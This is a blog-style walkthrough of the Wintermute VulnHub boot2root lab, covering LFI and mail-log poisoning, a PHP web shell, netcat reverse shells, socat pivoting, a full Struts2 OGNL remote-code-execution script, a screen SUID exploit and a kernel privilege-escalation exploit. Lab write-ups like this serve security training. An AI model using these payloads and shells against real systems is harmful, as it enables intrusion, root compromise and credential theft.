---
layout: post
title:  "Wintermute: Vulnhub Walkthrough"
date:   2020-01-01 15:07:19
categories: [tutorial]
comments: true
---
This is a boot2root machine hosted on [VulnHub][1] that was created by [creosote][2] and is part of a series called `WinterMute`. Its part of a series called billu and offers great insights into machine breaking. It offers learners experience with different vulnerabilities such as LFI and privesc via kernel exploitation. As stated previously spoilers are a must. The machine is quite long we'll split into two parts. Hope you enjoy. Word from the author.

```
A new OSCP style lab involving 2 vulnerable machines, themed after the cyberpunk classic Neuromancer -
a must read for any cyber-security enthusiast. This lab makes use of pivoting and post exploitation,
which I've found other OSCP prep labs seem to lack. The goal is the get root on both machines.
All you need is default Kali Linux.

I'd rate this as Intermediate. No buffer overflows or exploit development - any necessary password
cracking can be done with small wordlists. It's much more related to an OSCP box vs a CTF.
I've tested it quite a bit, but if you see any issues or need a nudge PM me here.

Virtual Box Lab setup instructions are included in the zip download, but here's a quick brief:

Straylight - simulates a public facing server with 2 NICS. Cap this first, then pivot to the final
machine. Neuromancer - is within a non-public network with 1 NIC. Your Kali box should ONLY be on the
same virtual network as Straylight.


Requires VirtualBox. VMware will not import correctly.
```

<!--more-->
## Introduction
First things first I'll explain how to set up the box.
It took 3 days just to get this box working. As the creator said, you'll need to use VirtualBox.
Steps
1. Make sure you running VirtualBox as an administrator. My computer had higher security settings hence the issues I encountered.
2. Add a second NIC adapter.
3. Ensure Straylight has two NIC cards attached.
4. Neuromancer has only 1 NIC. Shouldn't be directly accessible by the attacking box. If it is you're cheating.

## Information Gathering
nmap scan:
We'll be using `nmapAutomatomator`, source provided:
```
kali@kali:~/vulnhub/wintermute/192.168.251.5$ cat nmap/Quick_192.168.251.5.nmap
# Nmap 7.80 scan initiated Wed Apr 15 12:21:07 2020 as: nmap -Pn -T4 --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit --open -oN nmap/Quick_192.168.251.5.nmap 192.168.251.5
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.251.5
Host is up (0.00075s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
25/tcp   open  smtp
80/tcp   open  http
3000/tcp open  ppp
```
Navigating to the home page
Port 80

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-1.png)

Which re-directs to this:

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-2.png)

Next we'll investigater port 3000:

http://192.168.251.5:3000/lua/login.lua?referer=/

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-3.png)

Hint: the default user and password are admin. Use these credentials and we're in.

Once we're in change the `Interfaces > lo`. Next click on the `Flows` tab. Once here we find two links `/turing-bolo/ ` and `freeside`.


![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-4.png)


http://192.168.251.5/freeside

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-5.png)

Nothing of interest here:

http://192.168.251.5/turing-bolo/

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-6.png)

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-7.png)
When we click `Submit Query` we're taken to this link, `http://192.168.251.5/turing-bolo/bolo.php?bolo=case`.

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-8.png)


Smells of LFI, since we've got the `=` sign. When try using `../../../../../etc/passwd` we get no results. However when we try to navigate to the root of the directory; taking a hint from this page we can go to any of these directories.

    http://192.168.251.5/turing-bolo/case.log
    http://192.168.251.5/turing-bolo/molly.log
    http://192.168.251.5/turing-bolo/armitage.log
    http://192.168.251.5/turing-bolo/riviera.log

Are all available? Yes. Hence LFI is confirmed.

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-9.png)


We can make two conclusion:
1. we can only execute files that end with the `.log` extension
2. we're using a version of php higher than php 5.3 as we can't append the nullbyte `%00` or question mark ? to get around execution.

http://192.168.251.7/turing-bolo/bolo.php?bolo=../../../../../var/www/html/turing-bolo/case

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-10.png)

Remember earlier we found smtp
25/tcp   open  smtp            Postfix smtpd
|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
We'll start hunting for the logs.
A Google search tell where the logs can be found `var/log/mail.log`.
Guess what its in log file

http://192.168.251.5/turing-bolo/bolo.php?bolo=../../../../var/log/mail

For an easier read.
```
view-source:http://192.168.251.5/turing-bolo/bolo.php?bolo=../../../../var/log/mail.

Apr 14 19:24:31 straylight postfix/smtpd[4787]: connect from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4787]: SSL_accept error from unknown[192.168.251.4]: -1
Apr 14 19:24:31 straylight postfix/smtpd[4787]: warning: TLS library problem: error:1417D18C:SSL routines:tls_process_client_hello:version too low:../ssl/statem/statem_srvr.c:974:
Apr 14 19:24:31 straylight postfix/smtpd[4787]: lost connection after STARTTLS from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4787]: disconnect from unknown[192.168.251.4] ehlo=1 starttls=0/1 commands=1/2
Apr 14 19:24:31 straylight postfix/smtpd[4723]: connect from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4786]: lost connection after STARTTLS from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4786]: disconnect from unknown[192.168.251.4] ehlo=1 starttls=0/1 commands=1/2
Apr 14 19:24:31 straylight postfix/smtpd[4723]: SSL_accept error from unknown[192.168.251.4]: -1
Apr 14 19:24:31 straylight postfix/smtpd[4723]: warning: TLS library problem: error:1417D18C:SSL routines:tls_process_client_hello:version too low:../ssl/statem/statem_srvr.c:974:
Apr 14 19:24:31 straylight postfix/smtpd[4723]: lost connection after STARTTLS from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4723]: disconnect from unknown[192.168.251.4] ehlo=1 starttls=0/1 commands=1/2
Apr 14 19:24:31 straylight postfix/smtpd[4736]: connect from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4736]: SSL_accept error from unknown[192.168.251.4]: -1
Apr 14 19:24:31 straylight postfix/smtpd[4736]: warning: TLS library problem: error:1417D18C:SSL routines:tls_process_client_hello:version too low:../ssl/statem/statem_srvr.c:974:
Apr 14 19:24:31 straylight postfix/smtpd[4736]: lost connection after STARTTLS from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4736]: disconnect from unknown[192.168.251.4] ehlo=1 starttls=0/1 commands=1/2
Apr 14 19:24:31 straylight postfix/smtpd[4723]: connect from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4723]: SSL_accept error from unknown[192.168.251.4]: -1
Apr 14 19:24:31 straylight postfix/smtpd[4723]: warning: TLS library problem: error:1417D18C:SSL routines:tls_process_client_hello:version too low:../ssl/statem/statem_srvr.c:974:
Apr 14 19:24:31 straylight postfix/smtpd[4723]: lost connection after STARTTLS from unknown[192.168.251.4]
Apr 14 19:24:31 straylight postfix/smtpd[4723]: disconnect from unknown[192.168.251.4] ehlo=1 starttls=0/1 commands=1/2
Apr 14 19:27:52 straylight postfix/anvil[4594]: statistics: max connection rate 21/60s for (smtp:192.168.251.4) at Apr 14 19:24:31
Apr 14 19:27:52 straylight postfix/anvil[4594]: statistics: max connection count 4 for (smtp:192.168.251.4) at Apr 14 19:21:15
Apr 14 19:27:52 straylight postfix/anvil[4594]: statistics: max cache size 2 at Apr 14 19:21:08
Apr 15 04:14:16 straylight postfix/postfix-script[759]: starting the Postfix mail system
Apr 15 04:14:16 straylight postfix/master[761]: daemon started -- version 3.1.8, configuration /etc/postfix
All the activities have been logged including those during the scan process.
```
We can also use `PayloadsAllTheThings/File\ Inclusion/Intruders/` and wfuzz to bruteforce for possible directories.

Create a list as follows:

    kali@kali:~$ grep '.log$' PayloadsAllTheThings/File\ Inclusion/Intruders/*.txt | grep -Eiv  "windows|\mac" | cut -d ":" -f 2 | awk -F ".log$" '{print $1}'  > Logs.txt

Using the newly created list attempt to bruteforce for other possible directories.
```
kali@kali:~$ cd vulnhub/wintermute/ && wfuzz -c -z file,Logs.txt --hl 27 http://192.168.251.7/turing-bolo/bolo.php?bolo=FUZZ


Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.251.7/turing-bolo/bolo.php?bolo=FUZZ
Total requests: 370

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000269:   200        312 L    2998 W   30789 Ch    "/var/log/mail"

Total time: 1.762120
Processed Requests: 370
Filtered Requests: 368
Requests/sec.: 209.9742

```
We get the results we had before, work checking whilst doing other machines.

Next step is to do some log poisoning. Using `PayloadsAllTheThings/File\ Inclusion/ `

Please note:
```
mail from: <tmix@dany.ke>
rcpt to: <?php  -r '$sock=fsockopen("192.168.251.4",4242);exec("/bin/sh -<&3 >&3 2>&3");'  ?>
```
Using this payload for RCE kills the port

We'll stick to safety

```
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_REQUEST['cmd']); ?>
data2

```
In some cases you can also send the email with the
```
mail from: <tmix@dany.ke>
rcpt to: <?php echo system ($_REQUEST['cmd']); ?>
```
Next we need to send a reverse shell.
Go to pentest monkey for some payloads;
We'll use:

    curl -v http://192.168.251.7/turing-bolo/bolo.php?bolo=../../../var/log/mail \
    --data-urlencode \
    'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.251.4 4242 >/tmp/f'

Start the listener, and we get a connection once the command above is executed
```
kali@kali:~$ nc -lnvp 4242

listening on [any] 4242 ...
connect to [192.168.251.4] from (UNKNOWN) [192.168.251.7] 42346
/bin/sh: 0: can't access tty; job control turned off
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@straylight:/var/www/html/turing-bolo$ ^Z
[1]+  Stopped                 nc -lnvp 4242
kali@kali:~$ stty raw -echo


www-data@straylight:/var/www/html/turing-bolo$ export TERM=xterm
```
Download enumeration scripts. First spin a python server on Attack box:

    kali@kali:~$ cd postexp && sudopython -m SimpleHTTPServer 80

Then download the scipts,
```
www-data@straylight:/dev/shm$ wget -r -np 192.168.251.4/

www-data@straylight:/dev/shm/192.168.251.4:8000$ bash les.sh
```
No kernel exploit is available

    www-data@straylight:/dev/shm/192.168.251.4:8000$ bash LinEnum.sh

Going through the report shows, there's a second network interface. Its connected to another machine.
```
### NETWORKING  ##########################################
[-] Network and IP info:
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.251.7  netmask 255.255.255.0  broadcast 192.168.251.255
        inet6 fe80::a00:27ff:fedf:21fb  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:df:21:fb  txqueuelen 1000  (Ethernet)
        RX packets 2133  bytes 708829 (692.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 458  bytes 78051 (76.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.219.8  netmask 255.255.255.0  broadcast 192.168.219.255
        inet6 fe80::a00:27ff:fe4f:a80c  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:4f:a8:0c  txqueuelen 1000  (Ethernet)
        RX packets 951  bytes 500750 (489.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 27  bytes 3832 (3.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

...
```
From LinEnum.sh shows us screen with suid bit set and a version number,

    -rwsr-xr-x 1 root root 1543016 May 12  2018 /bin/screen-4.5.0

kali@kali:~$ searchsploit screen 4.5

![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-11.png)

Download the exploit
```
www-data@straylight:/dev/shm/192.168.251.4:8000$ wget 192.168.251.4:8000/41154.sh
www-data@straylight:/dev/shm/192.168.251.4:8000$ bash 41154.sh
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```
Note, the script returns lots of errors. We're now in as root. Remember we're
not done yet. When looking around in root we find a note left for us.
```
# python -c "import pty;pty.spawn('/bin/bash')"
root@straylight:/etc# cd /root

root@straylight:/root# cat note.txt

Devs,

Lady 3Jane has asked us to create a custom java app on Neuromancer's primary
server to help her interact w/ the AI via a web-based GUI.

The engineering team couldn't strss enough how risky that is, opening up a Super
AI to remote access on the Freeside network. It is within out internal admin network,
but still, it should be off the network completely. For the sake of humanity, user
access should only be allowed via the physical console...who knows what this thing
can do.

Anyways, we've deployed the war file on tomcat as ordered - located here:

/struts2_2.3.15.1-showcase

It's ready for the devs to customize to her liking...I'm stating the obvious, but
make sure to secure this thing.

Regards,

Bob Laugh
Turing Systems Engineer II
Freeside//Straylight//Ops5
```
Previously we'd noted that there was 2 interface cards, hence we'll ping to fing the other IP addresses;
```
root@straylight:/etc# for i in {1..254};do (ping 192.168.219.$i -c 1 -w 5 > /dev/null && echo "192.168.219.$i" &) ; done
192.168.219.1
192.168.219.2
192.168.219.6
192.168.219.8
```
The ip of Neuromancer is `192.168.219.6`. Next thing we do is an port scan of that address.
```
root@straylight:/etc# nc -nvz -w 1 192.168.219.6 1-65535
(UNKNOWN) [192.168.219.6] 34483 (?) open
(UNKNOWN) [192.168.219.6] 8080 (http-alt) open
(UNKNOWN) [192.168.219.6] 8009 (?) open
```
We get 3 open ports 8009, 8080, 34483. Previously from LinEnum we found that socat is installed we shall use it to forward this ports to our address.
Using socat;
This activity was such a minder bender:
Lets break it down
```
socat tcp-listen:8009,fork tcp:192.168.219.6:8009 &
socat tcp-listen:8080,fork tcp:192.168.219.6:8080 &
socat tcp-listen:34483,fork tcp:192.168.219.6:34483 &

socat tcp-listen:4321,fork tcp:192.168.251.4:4321 &
```
![1-1.png](/assets/images/posts/wintermute-vulnhub-walkthrough/1-12.png)
When we scan target straylight from the attacking kali box we can see all ports have been forwarded.

Previously, we had seen that we had been given `/struts2_2.3.15.1-showcase`, Checking if the service is vulnerable;

```
kali@marksmith:~$ searchsploit struts 2.3
---------------------------------------- ----------------------------------------
 Exploit Title                          |  Path
                                        | (/usr/share/exploitdb/)
---------------------------------------- ----------------------------------------
Apache Struts 2 < 2.3.1 - Multiple Vuln | exploits/multiple/webapps/18329.txt
Apache Struts 2.0.1 < 2.3.33 / 2.5 < 2. | exploits/multiple/remote/44556.py
Apache Struts 2.2.3 - Multiple Open Red | exploits/multiple/remote/38666.txt
Apache Struts 2.3 < 2.3.34 / 2.5 < 2.5. | exploits/linux/remote/45260.py
Apache Struts 2.3 < 2.3.34 / 2.5 < 2.5. | exploits/multiple/remote/45262.py
Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2. | exploits/linux/webapps/41570.py
Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2. | exploits/multiple/remote/41614.rb
Apache Struts 2.3.x Showcase - Remote C | exploits/multiple/webapps/42324.py
Apache Struts < 1.3.10 / < 2.3.16.2 - C | exploits/multiple/remote/41690.rb
Apache Struts2 2.0.0 < 2.3.15 - Prefixe | exploits/multiple/webapps/44583.txt
---------------------------------------- ----------------------------------------
Shellcodes: No Result

```
Struts is vulnerable and we'll using a modified version of `45260.py` let's call it exploit.sh

```
#!/bin/bash

RHOST=192.168.251.7
RPORT=8080
TARGETURI=struts2_2.3.15.1-showcase/integration
URL=http://$RHOST:$RPORT/$TARGETURI/saveGangster.action
CMD="$1"
PAYLOAD=""
PAYLOAD="${PAYLOAD}%{"
PAYLOAD="${PAYLOAD}(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
PAYLOAD="${PAYLOAD}(#_memberAccess?(#_memberAccess=#dm):"
PAYLOAD="${PAYLOAD}((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
PAYLOAD="${PAYLOAD}(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
PAYLOAD="${PAYLOAD}(#ognlUtil.getExcludedPackageNames().clear())."
PAYLOAD="${PAYLOAD}(#ognlUtil.getExcludedClasses().clear())."
PAYLOAD="${PAYLOAD}(#context.setMemberAccess(#dm))))."
PAYLOAD="${PAYLOAD}(@java.lang.Runtime@getRuntime().exec('$CMD'))"
PAYLOAD="${PAYLOAD}}"

usage() {
          echo "Usage: $(basename $0) [COMMAND]" >&2
            exit 1
    }

if [ $# -ne 1 ]; then
          usage
fi

curl -s \
             -H "Referer: http://$RHOST:$RPORT/$TARGETURI/editGangster" \
                  --data-urlencode "name=$PAYLOAD" \
                       --data-urlencode "age=20" \
                            --data-urlencode "__checkbox_bustedBefore=true" \
                                 --data-urlencode "description=1" \
                                      -o /dev/null \
                                           $URL
```

As part of the port forwarding we'll be hitting the second interface of straylight:
Create a rs.sh and spin a python server.

```
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.219.8 4321 >/tmp/f
```
Just to explain what's gonna happen.
1. Struts is vulnerable to RCE.
2. Since its running struts hence Java, we're not able to get the payload executed directly from the vulnerability.
3. Using wget, place a reverse shell cmd in the temp directory.
4. Since there a port forward to the attacking IP. The wget request will be to same netwrk as Neuromancer(this part is a bit confusing) pay close to attention to the IPs.
```
kali@kali:~/vulnhub/wintermute/privesc$ ./exploit.sh "wget 192.168.219.8:4321/rs.sh -O /tmp/rs.sh && cd /tmp && chmod 400 rs.sh"
kali@kali:~/vulnhub/wintermute/privesc$ ./exploit.sh "cd /tmp && ./rs.sh"
```
On the attack box we've a listener as on nc -lnvp 4321. Gives us a reverse shell as user ta. This shell is a bit dodgy. We got two options:
1. Place ssh key in his home directory of ta or login via ssh
2. There's second user lady3jane and we could login as her.

```
$ id
uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
$ uname -a
Linux neuromancer 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
$ find / -name tomcat 2> /dev/null
/usr/local/tomcat
$ cd /usr/local/tomcat/conf
$ cat tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
Eng.,

Tomcat is still using basic auth. I encoded the password so the AI's security scans don't flag it.

Is this what Bob keeps talking about, "Security by obscurity?"

Ed Occam//Sys.Engineer I//Night City
"Harry, I took care of it" - Llyod Christmas
-->

  <role rolename="manager-gui"/>
  <user username="Lady3Jane" password="&gt;&#33;&#88;&#120;&#51;&#74;&#97;&#110;&#101;&#120;&#88;&#33;&lt;" roles="manager-gui"/>

<!--
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
</tomcat-users>
```
From this we obtain an encrypted password. Using Burp to decrypt:
```
  user: lady3jane
  password:
```
ssh is case sensitive as we learnt, we wasted time using the user name below. Remember ssh is running on port 34483:

```
kali@kali:~/vulnhub/wintermute/privesc$ ssh Lady3Jane@192.168.251.7 -p 34483
The authenticity of host '[192.168.251.7]:34483 ([192.168.251.7]:34483)' can't be established.
ECDSA key fingerprint is SHA256:oUL2wjfAFRqayjqOgc79xVYeSqvD92zqaV+4udNxJrw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.251.7]:34483' (ECDSA) to the list of known hosts.
 ----------------------------------------------------------------
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 ----------------------------------------------------------------
Lady3Jane@192.168.251.7's password:
Permission denied, please try again.
Lady3Jane@192.168.251.7's password:
Permission denied, please try again.
Lady3Jane@192.168.251.7's password:
Lady3Jane@192.168.251.7: Permission denied (publickey,password).
kali@kali:~/vulnhub/wintermute$ ssh lady3jane@192.168.251.7 -p 34483
 ----------------------------------------------------------------
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 ----------------------------------------------------------------
lady3jane@192.168.251.7's password:
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
44 updates are security updates.

lady3jane@neuromancer:~$ uname -a
Linux neuromancer 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
lady3jane@neuromancer:~$ exit
logout
Connection to 192.168.251.7 closed.
```
It looks like the Kernel version Neuromancer is running is vulnerable. However, neuromancer doesn't have gcc to compile.
```
kali@kali:~/vulnhub/wintermute/privesc$ searchsploit linux 4.4.0-116
----------------------------------------- ----------------------------------------
 Exploit Title                           |  Path
                                         | (/usr/share/exploitdb/)
----------------------------------------- ----------------------------------------
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4 | exploits/linux/local/44298.c
----------------------------------------- ----------------------------------------
Shellcodes: No Result
kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ searchsploit -x exploits/linux/local/44298.c
  Exploit: Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/44298
     Path: /usr/share/exploitdb/exploits/linux/local/44298.c
File Type: C source, ASCII text, with CRLF line terminators
kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ cp /usr/share/exploitdb/exploits/linux/local/44298.c .
kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ head 44298.c
/*
 * Ubuntu 16.04.4 kernel priv esc
 *
 * all credits to @bleidl
 * - vnik
 */

// Tested on:
// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
// if different kernel adjust CRED offset + check kernel stack size
kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ gcc 44298.c -o 44298
```
Spin up a server and get the compiled binary.
```
kali@kali:~/vulnhub/wintermute/privesc/neuromancer$ python -m SimpleHTTPServer 4321
Serving HTTP on 0.0.0.0 port 4321 ...
192.168.251.7 - - [01/May/2020 08:31:01] "GET /44298 HTTP/1.1" 200 -
^CTraceback (most recent call last):
  File "/usr/lib/python2.7/runpy.py", line 174, in _run_module_as_main
    "__main__", fname, loader, pkg_name)
  File "/usr/lib/python2.7/runpy.py", line 72, in _run_code
    exec code in run_globals
  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 235, in <module>
    test()
  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 231, in test
    BaseHTTPServer.test(HandlerClass, ServerClass)
  File "/usr/lib/python2.7/BaseHTTPServer.py", line 610, in test
    httpd.serve_forever()
  File "/usr/lib/python2.7/SocketServer.py", line 231, in serve_forever
    poll_interval)
  File "/usr/lib/python2.7/SocketServer.py", line 150, in _eintr_retry
    return func(*args)
KeyboardInterrupt
```
On the victim box:
```
$ uname -a
Linux neuromancer 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
$ gcc
/bin/sh: 90: gcc: not found
$ wget 192.168.219.8:4321/44298 -O /dev/shm
/dev/shm: Is a directory
$ wget 192.168.219.8:4321/44298 -O /dev/shm/44298
--2020-04-30 07:47:02--  http://192.168.219.8:4321/44298
Connecting to 192.168.219.8:4321... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17888 (17K) [application/octet-stream]
Saving to: ‘/dev/shm/44298’

     0K .......... .......                                    100% 52.4K=0.3s

2020-04-30 07:47:02 (52.4 KB/s) - ‘/dev/shm/44298’ saved [17888/17888]

$ cd /dev/shm
$ bash 44298
44298: 44298: cannot execute binary file
$ chmod +x 44298
$ ls -alh
total 20K
drwxrwxrwt  2 root root   60 Apr 30 07:47 .
drwxr-xr-x 20 root root 3.9K Apr 30 03:45 ..
-r-x--x---  1 ta   ta    18K Apr 30  2020 44298
$ ./44298
id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(ta)

```
Done, we're finally in as root. Box complete

### Learnings
1. LFI with a paramaeter appended at the end
2. Port forwarding with socat
3. Scanning for other machines using ping
4. Scanning for ports using nc

Check out the [Jekyll docs][jekyll] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll’s dedicated Help repository][jekyll-help].

[jekyll]:      http://jekyllrb.com
[jekyll-gh]:   https://github.com/jekyll/jekyll
[jekyll-help]: https://github.com/jekyll/jekyll-help

[1]: https://www.vulnhub.com/entry/wintermute-1,239/
[2]: https://twitter.com/@_creosote
[3]: https://www.vulnhub.com/
[4]: https://github.com/21y4d/nmapAutomator
